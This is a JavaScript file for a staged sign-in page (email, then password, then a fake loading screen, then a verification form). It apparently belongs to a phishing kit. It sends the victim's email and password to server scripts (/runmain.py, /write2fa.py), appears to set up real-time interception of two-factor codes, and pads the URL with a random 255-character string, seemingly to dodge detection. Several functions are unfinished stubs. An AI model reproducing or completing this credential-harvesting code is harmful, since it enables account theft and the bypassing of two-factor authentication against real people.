var nextBtn = document.querySelector(".sign-in-next-btn-submit");
var signInBtn = document.querySelector(".sign-in-btn-submit")

var verifyDiv = document.querySelector(".verification-form")

var passwordDiv = document.querySelector(".password-sign-in-form");
var emailDiv = document.querySelector(".email-sign-in-form");
var loadingDiv = document.querySelector(".loading-screen");



// attach an event listener to the submit button
// var form = document.getElementById('sign-in-form');
// form.addEventListener("click", function(event) {
//   event.preventDefault();

//   const username = document.getElementById('username').value;
//   const password = document.getElementById('password').value;

//   //...
// });
//create sign in function for the website
function signIn(event){
  event.preventDefault();

  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  //...
}

//create function that will check if the user is logged in






// write function that will check if login status file exists and will allow the login to continue 2fa
// if the file does not exist then it will create the file and send the user to the 2fa page
// if the file exists then it will send the user to the 2fa page//write function that will check if login status file exists and will allow the login to continue to 2fa

// function 2fa() {
//   $.ajax({
//       type: "POST",
//       url: "/new.py",
//       data: { param:},
//       success: callbackFunc
//   });
// }


//testing stuff
function makeid(length) {
  let result = '?';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}

if (history.pushState) {
    var newurl = window.location.protocol + "//" + window.location.host + window.location.pathname + makeid(255);
    window.history.pushState({path:newurl},'',newurl);
}

//call python function

function postData(email, password) {
  $.ajax({
      type: "POST",
      url: "/runmain.py",
      data: { param: email,password },
      success: callbackFunc
  });
}

function callortext(email, password, isCall) {
  if (isCall == 1){
    $.ajax({
      type: "POST",
      url: "/write2fa.py",
      data: { param: email,password },
      success: callbackFunc
  });
  }

}


function callbackFunc(response) {
  // do something with the response
  console.log(response);
}
// postData("test")

nextBtn.addEventListener("click", function(event) {
  event.preventDefault(); 
  passwordDiv.style.display = "block";
  emailDiv.style.display = "none";
});

signInBtn.addEventListener("click", function(event) {
  event.preventDefault(); 
  loadingDiv.style.display = "block";
  passwordDiv.style.display = "none";
  removeLoadingDiv();
});

let usernameValue = localStorage.getItem("username") || "";

function returnUsername() {
  usernameValue = document.getElementById("username").value;
  localStorage.setItem("username", usernameValue);
  document.getElementById("display-name").innerHTML = usernameValue;
  return usernameValue;
}

document.getElementById("username").addEventListener("keyup", returnUsername);


function removeLoadingDiv() {
  const loadingDiv = document.querySelector(".loading-screen-div");
  if (loadingDiv) {
    setTimeout(() => {
      loadingDiv.style.display = "none";
      verifyDiv.style.display ="block"
    }, 2500);
  }
}







